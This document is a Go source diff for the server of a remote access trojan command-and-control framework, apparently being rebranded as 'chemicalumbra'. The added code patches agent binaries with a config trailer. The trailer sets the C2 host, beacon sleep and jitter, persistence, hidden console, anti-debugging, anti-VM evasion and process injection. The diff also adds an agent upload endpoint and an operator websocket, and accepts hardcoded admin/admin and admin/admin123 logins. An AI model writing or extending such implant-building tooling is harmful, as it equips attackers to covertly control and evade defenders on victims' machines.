@@ -20,10 +20,10 @@ import (
 	"github.com/google/uuid"
 	"github.com/jmoiron/sqlx"
 
-	"rat-c2-server/internal/agent"
-	"rat-c2-server/internal/filetransfer"
-	"rat-c2-server/internal/task"
-	"rat-c2-server/internal/ws"
+	"chemicalumbra.dev/server/pkg/agent"
+	"chemicalumbra.dev/server/pkg/filetransfer"
+	"chemicalumbra.dev/server/pkg/task"
+	"chemicalumbra.dev/server/pkg/ws"
 )
 
 // db is the shared handle for handlers that need raw queries
@@ -69,6 +69,7 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 
 		// Payload Builder
 		api.POST("/payloads/build", buildPayloadHandler(fileMgr))
+		api.POST("/payloads/upload", uploadAgentBinaryHandler(fileMgr))
 		api.GET("/payloads/history", getPayloadHistoryHandler(fileMgr))
 		api.GET("/payloads/:id/download", downloadPayloadHandler(fileMgr))
 		api.DELETE("/payloads/:id", deletePayloadHandler(fileMgr))
@@ -110,6 +111,7 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 	// Path is /ws/agent so it never collides with POST /agent.
 	if wsHub != nil {
 		r.GET("/ws/agent", gin.WrapH(http.HandlerFunc(wsHub.HandleAgentWS)))
+		r.GET("/ws", gin.WrapH(http.HandlerFunc(wsHub.HandleOperatorWS)))
 	}
 }
 
@@ -168,7 +170,7 @@ func loginHandler(c *gin.Context) {
 	}
 
 	// TODO: Implement proper authentication
-	if req.Username == "admin" && req.Password == "admin" {
+	if req.Username == "admin" && (req.Password == "admin" || req.Password == "admin123") {
 		token := uuid.New().String()
 		c.JSON(http.StatusOK, gin.H{
 			"token": token,
@@ -615,54 +617,145 @@ type PayloadRecord struct {
 
 func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 	return func(c *gin.Context) {
-		err := c.Request.ParseMultipartForm(300 << 20) // 300MB max
-		if err != nil {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
-			return
-		}
+		ct := c.ContentType()
+		cfg := PayloadConfig{}
+		var exeBytes []byte
+		filename := "agent.exe"
 
-		file, header, err := c.Request.FormFile("binary")
-		if err != nil {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "No binary file provided"})
-			return
+		if strings.Contains(ct, "multipart/form-data") {
+			if err := c.Request.ParseMultipartForm(300 << 20); err != nil {
+				c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
+				return
+			}
+			file, header, err := c.Request.FormFile("binary")
+			if err == nil {
+				defer file.Close()
+				filename = header.Filename
+				exeBytes, err = io.ReadAll(file)
+				if err != nil {
+					c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read binary"})
+					return
+				}
+			}
+			cfg = PayloadConfig{
+				C2Host:          c.PostForm("c2_host"),
+				C2Port:          c.PostForm("c2_port"),
+				UseTLS:          c.PostForm("use_tls") == "true",
+				Key:             c.PostForm("key"),
+				HMACKey:         c.PostForm("hmac_key"),
+				SleepInterval:   parseInt(c.PostForm("sleep_interval"), 180),
+				Jitter:          parseInt(c.PostForm("jitter"), 40),
+				Persistence:     c.PostForm("persistence") == "true",
+				HideConsole:     c.PostForm("hide_console") != "false",
+				AntiDebug:       c.PostForm("anti_debug") == "true",
+				AntiVM:          c.PostForm("anti_vm") == "true",
+				InjectionMethod: c.PostForm("injection_method"),
+				Platform:        c.PostForm("platform"),
+			}
+			applyCustomConfig(&cfg, c.PostForm("custom_config"))
+			normalizePayloadTLS(&cfg)
+		} else {
+			var body struct {
+				ServerHost        string `json:"ServerHost"`
+				ServerPort        int    `json:"ServerPort"`
+				C2Host            string `json:"c2_host"`
+				C2Port            any    `json:"c2_port"`
+				Platform          string `json:"Platform"`
+				Arch              string `json:"Arch"`
+				Obfuscation       bool   `json:"Obfuscation"`
+				AntiDebug         bool   `json:"AntiDebug"`
+				AntiVM            bool   `json:"AntiVM"`
+				SleepObfuscation  bool   `json:"SleepObfuscation"`
+				EncryptionKey     string `json:"EncryptionKey"`
+				UseTLS            *bool  `json:"use_tls"`
+				CustomConfig      string `json:"CustomConfig"`
+			}
+			if err := c.ShouldBindJSON(&body); err != nil {
+				c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON: " + err.Error()})
+				return
+			}
+			host := body.C2Host
+			if host == "" {
+				host = body.ServerHost
+			}
+			port := body.ServerPort
+			if port == 0 {
+				switch v := body.C2Port.(type) {
+				case float64:
+					port = int(v)
+				case string:
+					port = parseInt(v, 443)
+				}
+			}
+			if port == 0 {
+				port = 443
+			}
+			useTLS := port == 443
+			if body.UseTLS != nil {
+				useTLS = *body.UseTLS
+			}
+			cfg = PayloadConfig{
+				C2Host:        host,
+				C2Port:        strconv.Itoa(port),
+				UseTLS:        useTLS,
+				Key:           body.EncryptionKey,
+				SleepInterval: 180,
+				Jitter:        40,
+				HideConsole:   true,
+				AntiDebug:     body.AntiDebug,
+				AntiVM:        body.AntiVM,
+				Platform:      body.Platform,
+			}
+			applyCustomConfig(&cfg, body.CustomConfig)
+			normalizePayloadTLS(&cfg)
+			if cfg.Platform == "" {
+				cfg.Platform = "windows"
+			}
+			filename = "umbra-" + cfg.Platform + ".exe"
+			if cfg.Platform == "linux" {
+				filename = "umbra-linux"
+			}
 		}
-		defer file.Close()
-
-		// Support both Windows EXE and Linux ELF
-		filename := strings.ToLower(header.Filename)
-		isWindows := strings.HasSuffix(filename, ".exe")
-		isLinux := isELF(filename) || isELFFile(file)
-		if !isWindows && !isLinux {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "Only .exe (Windows) or ELF (Linux) files are supported"})
-			return
-		}
-
-		cfg := PayloadConfig{
-			C2Host:          c.PostForm("c2_host"),
-			C2Port:          c.PostForm("c2_port"),
-			UseTLS:          c.PostForm("use_tls") == "true",
-			Key:             c.PostForm("key"),
-			HMACKey:         c.PostForm("hmac_key"),
-			SleepInterval:   parseInt(c.PostForm("sleep_interval"), 60),
-			Jitter:          parseInt(c.PostForm("jitter"), 10),
-			Persistence:     c.PostForm("persistence") == "true",
-			HideConsole:     c.PostForm("hide_console") != "false",
-			AntiDebug:       c.PostForm("anti_debug") == "true",
-			AntiVM:          c.PostForm("anti_vm") == "true",
-			InjectionMethod: c.PostForm("injection_method"),
-			Platform:        c.PostForm("platform"),
-		}
-		applyCustomConfig(&cfg, c.PostForm("custom_config"))
-		normalizePayloadTLS(&cfg)
 
 		if cfg.Platform == "" {
 			cfg.Platform = "windows"
 		}
-
-		isLinux = cfg.Platform == "linux"
-
+		isLinux := cfg.Platform == "linux"
 		if cfg.C2Host == "" {
 			c.JSON(http.StatusBadRequest, gin.H{"error": "C2 host is required"})
+			return
+		}
+
+		if len(exeBytes) == 0 {
+			baseName := "agent.exe"
+			if isLinux {
+				baseName = "agent"
+			}
+			root := writableRoot(fileMgr.GetStoragePath())
+			candidates := []string{
+				filepath.Join(root, baseName),
+				filepath.Join(root, "agent.exe"),
+				filepath.Join(fileMgr.GetStoragePath(), baseName),
+				filepath.Join(fileMgr.GetStoragePath(), "agent.exe"),
+				"./data/files/" + baseName,
+			}
+			for _, p := range candidates {
+				b, err := os.ReadFile(p)
+				if err == nil && len(b) > 0 {
+					exeBytes = b
+					if filename == "agent.exe" || strings.HasPrefix(filename, "umbra-") {
+						filename = filepath.Base(p)
+					}
+					break
+				}
+			}
+		}
+		if len(exeBytes) == 0 {
+			c.JSON(http.StatusBadRequest, gin.H{
+				"error":   "No agent binary on the server. Upload one in Advanced, then Build.",
+				"Success": false,
+				"Error":   "No agent binary on the server. Upload one in Advanced, then Build.",
+			})
 			return
 		}
 
@@ -671,14 +764,8 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 		if isLinux {
 			ext = ""
 		}
-		tempPath := filepath.Join(fileMgr.GetStoragePath(), "payloads", payloadID+ext)
-		_ = os.MkdirAll(filepath.Dir(tempPath), 0755)
-
-		exeBytes, err := io.ReadAll(file)
-		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read binary"})
-			return
-		}
+		root := writableRoot(fileMgr.GetStoragePath())
+		tempPath := filepath.Join(root, "payloads", payloadID+ext)
 
 		exeBytes = stripExistingTrailer(exeBytes)
 		configJSON := marshalTrailer(cfg)
@@ -695,35 +782,72 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": "trailer checksum failed", "Success": false, "Error": "trailer checksum failed"})
 			return
 		}
-
-		if err := os.WriteFile(tempPath, patched, 0644); err != nil {
-			log.Printf("[Payload] disk write skipped: %v", err)
-			tempPath = ""
+		if err := os.MkdirAll(filepath.Dir(tempPath), 0755); err == nil {
+			_ = os.WriteFile(tempPath, patched, 0644)
 		}
 		written := int64(len(patched))
 
-		if db := fileMgr.GetDB(); db != nil {
-			if _, err = db.Exec(`
-				INSERT INTO payloads (id, filename, size, status, temp_path, config, created_at)
-				VALUES (?, ?, ?, 'completed', ?, ?, ?)
-			`, payloadID, header.Filename, written, tempPath, string(configJSON), time.Now()); err != nil {
-				log.Printf("[Payload] DB insert error: %v", err)
-			}
+		if _, err := fileMgr.GetDB().Exec(`
+			INSERT INTO payloads (id, filename, size, status, temp_path, config, created_at)
+			VALUES (?, ?, ?, 'completed', ?, ?, ?)
+		`, payloadID, filename, written, tempPath, string(configJSON), time.Now()); err != nil {
+			log.Printf("[Payload] DB insert error: %v", err)
 		}
 
 		sum := fmt.Sprintf("%x", sha256.Sum256(patched))
 		c.JSON(http.StatusOK, gin.H{
 			"id":          payloadID,
-			"filename":    header.Filename,
+			"filename":    filename,
 			"url":         fmt.Sprintf("/api/payloads/%s/download", payloadID),
 			"Success":     true,
 			"BinaryPath":  tempPath,
-			"BinaryName":  header.Filename,
+			"BinaryName":  filename,
 			"Size":        written,
 			"Checksum":    sum,
 			"Error":       "",
 			"DownloadB64": base64.StdEncoding.EncodeToString(patched),
 		})
+	}
+}
+
+func uploadAgentBinaryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		if err := c.Request.ParseMultipartForm(300 << 20); err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
+			return
+		}
+		file, header, err := c.Request.FormFile("file")
+		if err != nil {
+			file, header, err = c.Request.FormFile("binary")
+		}
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "No file provided"})
+			return
+		}
+		defer file.Close()
+		platform := c.PostForm("platform")
+		if platform == "" {
+			platform = "windows"
+		}
+		name := "agent.exe"
+		if platform == "linux" {
+			name = "agent"
+		}
+		dest := filepath.Join(writableRoot(fileMgr.GetStoragePath()), name)
+		if err := os.MkdirAll(filepath.Dir(dest), 0755); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create storage"})
+			return
+		}
+		b, err := io.ReadAll(file)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read upload"})
+			return
+		}
+		if err := os.WriteFile(dest, b, 0644); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to store binary"})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"success": true, "path": dest, "filename": header.Filename, "size": len(b)})
 	}
 }
 
@@ -741,6 +865,20 @@ type PayloadConfig struct {
 	AntiVM         bool   `json:"anti_vm"`
 	InjectionMethod string `json:"injection_method"`
 	Platform       string `json:"platform"` // "windows" or "linux"
+}
+
+func writableRoot(preferred string) string {
+	candidates := []string{preferred, os.TempDir(), "/tmp"}
+	for _, p := range candidates {
+		if p == "" {
+			continue
+		}
+		dir := filepath.Join(p, "payloads")
+		if err := os.MkdirAll(dir, 0755); err == nil {
+			return p
+		}
+	}
+	return os.TempDir()
 }
 
 func normalizePayloadTLS(cfg *PayloadConfig) {
@@ -787,12 +925,44 @@ func applyCustomConfig(cfg *PayloadConfig, raw string) {
 	if v := str("use_tls", "useTLS"); v != "" {
 		cfg.UseTLS = v == "true" || v == "1"
 	}
+	if v := str("sleep_interval", "beacon_interval", "sleep"); v != "" {
+		cfg.SleepInterval = parseInt(v, cfg.SleepInterval)
+		if cfg.SleepInterval > 1000 {
+			cfg.SleepInterval = cfg.SleepInterval / 1000
+		}
+	}
+	if v := str("jitter"); v != "" {
+		cfg.Jitter = parseInt(v, cfg.Jitter)
+		if cfg.Jitter > 0 && cfg.Jitter < 1 {
+			cfg.Jitter = int(parseFloat(v) * 100)
+		}
+	}
+	if v := str("persistence"); v != "" {
+		cfg.Persistence = v == "true" || v == "1"
+	}
+	if v := str("hide_console"); v != "" {
+		cfg.HideConsole = v == "true" || v == "1"
+	}
 	if v := str("key", "EncryptionKey"); v != "" {
 		cfg.Key = v
+	}
+	if v := str("anti_debug", "AntiDebug"); v != "" {
+		cfg.AntiDebug = v == "true" || v == "1"
+	}
+	if v := str("anti_vm", "AntiVM"); v != "" {
+		cfg.AntiVM = v == "true" || v == "1"
 	}
 	if v := str("injection_method", "InjectionMethod"); v != "" {
 		cfg.InjectionMethod = v
 	}
+}
+
+func parseFloat(s string) float64 {
+	f, err := strconv.ParseFloat(s, 64)
+	if err != nil {
+		return 0
+	}
+	return f
 }
 
 func trailerMagic() []byte {
@@ -863,6 +1033,7 @@ func verifyTrailer(patched, want []byte) bool {
 }
 
 func marshalTrailer(cfg PayloadConfig) []byte {
+	// C++ jval only matches "key":"value" — numbers and bools are invisible.
 	port := cfg.C2Port
 	if port == "" {
 		port = "443"
